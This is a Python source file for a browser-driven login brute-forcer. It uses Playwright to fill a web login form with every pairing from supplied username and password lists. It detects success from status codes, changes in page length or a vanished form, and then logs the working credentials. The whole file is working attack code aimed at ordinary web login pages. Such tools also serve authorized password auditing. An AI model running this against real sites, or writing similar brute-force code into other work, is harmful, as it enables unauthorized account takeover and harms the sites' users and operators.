import logging
import sys
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright 

class headless:
    
    def __init__(self, url, web_parser,  pass_user) -> None:
        self._url = url
        self._web_parser = web_parser
        self._pass_user = pass_user
        
        
    async def brute(self) -> None:
        """
        sends all combinations for usernames and passwords to the attack function on the login page
        """
        p = await async_playwright().start()
    
        browser = await p.firefox.launch(headless=False)
        page = await browser.new_page()
        await page.goto(self._url)

        await page.wait_for_selector(self._web_parser.button_attr)
        
        
        for username in self._pass_user['Usernames']:
            for password in self._pass_user['Passwords']:
                page.on('response', lambda response: self._getResponse(response))

                content = await self._attack(username, password, page)
                await page.wait_for_event('response')
                if self._check_login(content):
                    logging.info("login successfull\n\nusername: "+ username+ "\npassword: "+ password)
                    await browser.close()
                    await p.stop()  
                    sys.exit()     
                await page.goto(self._url)
                await page.wait_for_selector(self._web_parser.button_attr)
        await browser.close()
        await p.stop()
        

        
    async def _attack(self, username, password, page):
        """
        create a packet containing fake headers and the payload(username,password) and submit it to the server
        """
        self.status_code = []
        await page.fill('input[name=' + self._web_parser.user_param +']', username)
        await page.fill('input[name=' +  self._web_parser.password_param +']', password)

        await page.locator(self._web_parser.button_attr).click()

        content = await page.content()
        return content


    def _getResponse(self, response) -> None:
        self.status_code= response.status
        
        
    def _check_login(self, content) -> bool:
        """
        checks if login was successful by checking if status code changed and checks if form is still in the page
        """
        if self.status_code >= 400:
            return False

        elif self.status_code != self._web_parser.status_code:
            return True
        
        elif ((abs(len(content) - self._web_parser.contentLen) / self._web_parser.contentLen) * 100.0) >= 20:
            return True
        
        parser = BeautifulSoup(content, 'html.parser')
        forms = parser.find_all('form')
        if self._web_parser.form not in forms:
            return True

        return False


    ########################################################################################

